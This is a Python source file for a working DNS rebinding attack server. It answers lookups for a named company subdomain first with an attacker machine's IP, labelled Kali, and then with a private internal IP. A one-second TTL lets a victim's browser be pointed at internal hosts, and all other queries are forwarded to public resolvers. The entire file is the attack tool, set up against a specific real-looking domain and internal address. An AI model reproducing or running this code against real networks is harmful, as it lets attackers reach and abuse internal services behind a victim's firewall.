import socket
import struct
import time
from datetime import datetime

# Conf
EXTERNAL_IP = "192.168.100.9"  # Kali
INTERNAL_IP = "10.143.40.157"    # int IP 
DOMAIN = "ns1ak.dell.com"

# DNS pub forwarding
UPSTREAM_DNS = [
    ('1.1.1.1', 53),    # Cloudflare
    ('8.8.8.8', 53),    # Google
    ('9.9.9.9', 53)     # Quad9
]

#  TTL
TTL_SECONDS = 1  # low to refresh

class DNSRebindServer:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('0.0.0.0', 53))
        self.query_count = {}
        self.last_query_time = {}
        print("DNS Rebind Server - Port 53")
        
    def get_ttl_bytes(self, ttl_seconds):
        """4 bytes big-endian for TTL"""
        return struct.pack('>I', ttl_seconds)
    
    def forward_dns_query(self, data):
        """DNS  servers upstream"""
        for dns_server in UPSTREAM_DNS:
            try:
                forward_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                forward_sock.settimeout(2)  # Timeout 2 seg
                forward_sock.sendto(data, dns_server)
                response, _ = forward_sock.recvfrom(1024)
                forward_sock.close()
                return response
            except Exception as e:
                forward_sock.close()
                print("  -> Error Redirect for {}: {}".format(dns_server, e))
                continue
        return None
    
    def parse_dns_query(self, data):
        transaction_id = data[:2]
        
        # Parse 
        query_start = 12
        domain_parts = []
        
        while True:
            length = data[query_start]
            if length == 0:
                break
            try:
                domain_parts.append(data[query_start+1:query_start+1+length].decode('utf-8', errors='ignore'))
            except:
                break
            query_start += 1 + length
        
        domain = '.'.join(domain_parts)
        try:
            query_type = struct.unpack('>H', data[query_start+1:query_start+3])[0]
            question_end = query_start + 5
        except:
            query_type = 1  # A record default
            question_end = query_start + 1
        
        return transaction_id, domain, query_type, question_end
    
    def build_dns_response(self, transaction_id, domain, client_ip, response_ip, question_section):
        response = transaction_id  # Transaction ID
        response += b'\x81\x80'    # Flags (Response, No Error)
        response += b'\x00\x01'    # Questions
        response += b'\x00\x01'    # Answer RRs
        response += b'\x00\x00'    # Authority RRs
        response += b'\x00\x00'    # Additional RRs
        
        # Complete Question
        response += question_section
        
        # Session Response
        response += b'\xc0\x0c'    # offset 12
        response += b'\x00\x01'    # Type A
        response += b'\x00\x01'    # Class IN
        response += self.get_ttl_bytes(TTL_SECONDS)  # TTL 
        response += b'\x00\x04'    # Data length (4 bytes for IPv4)
        response += socket.inet_aton(response_ip)  # IP address
        
        return response
    
    def dns_response(self, data, addr):
        try:
            transaction_id, domain, query_type, question_end = self.parse_dns_query(data)
            client_ip = addr[0]
            
            print("[{}] Query of {} to {} (Type: {})".format(
                datetime.now().strftime('%H:%M:%S'), client_ip, domain, query_type))
            
            # Extract Complete Question Section
            question_section = data[12:question_end]
            
            # Rebind target Verifier
            if domain.lower() == DOMAIN.lower():
                # Queries counts
                current_time = time.time()
                
                # Reset counter after 5 segs
                if client_ip in self.last_query_time and (current_time - self.last_query_time[client_ip]) > 5:
                    self.query_count[client_ip] = 0
                
                self.last_query_time[client_ip] = current_time
                self.query_count[client_ip] = self.query_count.get(client_ip, 0) + 1
                
                # Queries number alternation
                if self.query_count[client_ip] <= 1:
                    response_ip = EXTERNAL_IP
                    print("  -> Response with External IP : {}".format(response_ip))
                else:
                    response_ip = INTERNAL_IP
                    print("  -> Response with Internal IP: {}".format(response_ip))
                
                # Construct and foward Custom DNS Responses 
                response = self.build_dns_response(transaction_id, domain, client_ip, response_ip, question_section)
                return response
            else:
                # For others domains, forward to Pub DNS 
                print("  -> Fowarding Query to Pub DNS")
                forwarded_response = self.forward_dns_query(data)
                if forwarded_response:
                    return forwarded_response
                else:
                    # Fallback: response with error when don't foward
                    print("  -> Fowarding Error, return NXDOMAIN")
                    return data[:2] + b'\x81\x83' + data[4:]
            
        except Exception as e:
            print("Query Process Error: {}".format(e))
            # Return response with single error
            return data[:2] + b'\x81\x83' + data[4:]
    
    def run(self):
        print("DNS Rebind Server listening at port 53")
        print("Target Domain: {}".format(DOMAIN))
        print("Ext IP: {}".format(EXTERNAL_IP))
        print("Int IP: {}".format(INTERNAL_IP))
        print("TTL config: {} seg".format(TTL_SECONDS))
        print("DNS upstream: {}".format(UPSTREAM_DNS))
        print("-" * 50)
        
        while True:
            try:
                data, addr = self.sock.recvfrom(1024)
                response = self.dns_response(data, addr)
                self.sock.sendto(response, addr)
            except KeyboardInterrupt:
                print("\nClosed Server.")
                break
            except Exception as e:
                print("Error: {}".format(e))

if __name__ == "__main__":
    server = DNSRebindServer()
    server.run()
